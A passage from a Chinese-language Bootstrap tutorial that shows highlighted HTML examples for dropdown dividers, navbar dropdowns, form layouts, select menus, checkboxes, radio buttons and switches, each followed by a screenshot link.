      <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"dropdown-item"</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"dropdown-item"</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7c55467f89f54dd4952f58a5edbcee68~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=EJEwboZ6CSvoMKYCcIur4LzVTEs%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-141">下拉分割线</h3>
<p>我们可以使用<code>.dropdown-divider</code>和<code>.dropdown-header</code>用于水平细边框分割下拉列表的选项卡，和为下拉列表区域添加标题。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"dropdown m-4"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"button"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"btn btn-primary dropdown-toggle"</span> <span class="hljs-attr">data-bs-toggle</span>=<span class="hljs-string">"dropdown"</span>&gt;</span>下拉<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"dropdown-menu"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"dropdown-item"</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"dropdown-item"</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"dropdown-item"</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"dropdown-divider"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"dropdown-header"</span>&gt;</span>
            Polaris
        <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a2c8adaa3dc04dcdbaf492a7078a91b7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=MEiijJnRenzaKLlbdDZHTc0iCEQ%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-142">导航栏中的下拉菜单</h3>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container navbar navbar-expand-lg sticky-top"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"navbar-nav"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-item"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"navbar-brand"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>Polaris<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-item"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-link"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>HTML<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-item"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-link"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>CSS<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-item"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-link"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>Bootstrap<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-item dropdown"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-link dropdown-toggle"</span> <span class="hljs-attr">data-bs-toggle</span>=<span class="hljs-string">"dropdown"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>下拉<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"dropdown-menu"</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>
                  <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"dropdown-item"</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
              <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>
                  <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"dropdown-item"</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
              <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>
                  <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"dropdown-item"</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
              <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"dropdown-divider"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"dropdown-header"</span>&gt;</span>
                  Polaris
              <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/78285d03ed4246969c4cea7c72c4fe42~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=xyINlzQSdJb9i1cNM%2BUX%2F735MFc%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-143">Bootstrap 表单</h2>
<p>Bootstrap 提供了三种不同类型的表但布局分别是垂直表单(默认)、水平表单和内联表单。</p>
<h3 data-id="heading-144">创建基础表单</h3>
<p>我们可以通过想元素添加<code>.from-group</code>来创建表单控件。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container m-3"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"form-group"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"form-labe"</span>&gt;</span>名称<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">"请输入名称"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"form-control"</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>效果图如下:</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a8bce43e27ff446283b1e953d3a69fff~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=D3IRN5VQIdxAFjVgMknZ4Xzl8BE%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-145">创建内联表单</h4>
<p>表单并排显示可以使用<code>.row</code>和<code>.col</code>。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container m-3"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"row"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"form-group col"</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"form-labe"</span>&gt;</span>名称<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">"请输入名称"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"form-control"</span>&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"form-group col"</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"form-labe"</span>&gt;</span>密码<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">"请输入密码"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"form-control"</span>&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3544e92ceff246d7b935eb7add6848c1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=%2FQUgZ1tWWVNOc6jwJPebsrZjAk8%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-146">表单控件尺寸</h4>
<p>我们可以通过<code>.form-control-lg</code>和<code>.form-control-sm</code>来更改输入控件的大小。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container m-3"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"row"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"form-group col"</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"form-labe"</span>&gt;</span>名称<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">"请输入名称"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"form-control form-control-lg"</span>&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"form-group col"</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"form-labe"</span>&gt;</span>密码<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">"请输入密码"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"form-control form-control-sm"</span>&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/59bee3ccf9a34aecab49889155fad55d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=lbXlubjtNtOlFBRnMG52PJFmhD0%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-147">提示文本</h4>
<p>我们还可以使用<code>.form-text</code>为控件添加提示文本。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container m-3"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"row"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"form-group col"</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"form-labe"</span>&gt;</span>密码<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">"请输入密码"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"form-control form-control-lg"</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"form-text"</span>&gt;</span>必8-20个字符长度<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/90fa6e250eea48228aa1f352f3b0ad6d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=TOM8T8uNFMUR8Wh2UlYw2CbXI7c%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-148">选择菜单</h3>
<h4 data-id="heading-149">创建基础选择菜单</h4>
<p>我们可以将<code>.form-select</code>添加到<code>select</code>元素中</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container m-3"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"form-select"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">option</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">option</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">option</span>&gt;</span>3<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ec9986fb0a3b421fb140d05995495d91~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=YTli308TqT41Us%2FsBmRzlf%2FVw0g%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-150">选择菜单大小</h4>
<p>我们可以通过<code>.form-select-lg</code>和<code>.form-select-sm</code>来更改输入控件的大小。</p>
<h4 data-id="heading-151">多选菜单</h4>
<p>我们可以在<code>select</code>选择上添加<code>multiple</code>属性来让我们选择框变为多选框。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container m-3"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"form-select"</span> <span class="hljs-attr">multiple</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">option</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">option</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">option</span>&gt;</span>3<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e88c56a56951422abee8a93173828db0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=L6rGViNay5DlnVvSaDz3rG12iHc%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-152">复选框与单选框</h3>
<p>我们可以通过<code>.form-check</code>来定义多选或者单选按钮。</p>
<h4 data-id="heading-153">复选框</h4>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container m-3"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"form-check"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"checkbox"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"form-check-input"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"form-check-label"</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"form-check"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"checkbox"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"form-check-input"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"form-check-label"</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3be7340e53354116883c018d4432840c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=kJWs5Fmm7T2583vC%2FRukHJAdz1o%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-154">单选框</h4>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container m-3"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"form-check"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"radio"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"form-check-input"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"form-check-label"</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"form-check"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"radio"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"form-check-input"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"form-check-label"</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/56412ba5893b42a080371a9ba6d449a7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=y64R6x7OsTJ5fuccBFICQrQh3Y0%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-155">开关</h3>
<p>我们可以在将<code>.form-switch</code>与<code>.form-check</code>容器一起使用。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container m-3"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"form-check form-switch"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"checkbox"</span> <span class="hljs-attr">checked</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"form-check-input"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"form-check-label"</span>&gt;</span>开关<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/13e6173253ac4e8f82a21e8c1719133c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=u2%2BoVpMowELN9VN6KoF470prCPk%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-156">滑块</h3>
<p>我们可以使用<code>.form-range</code>添加到<code>type="range"</code>的<code>input</code>元素中来创建滑块样式。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container m-3"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"form-check form-switch"</span>&gt;</span>
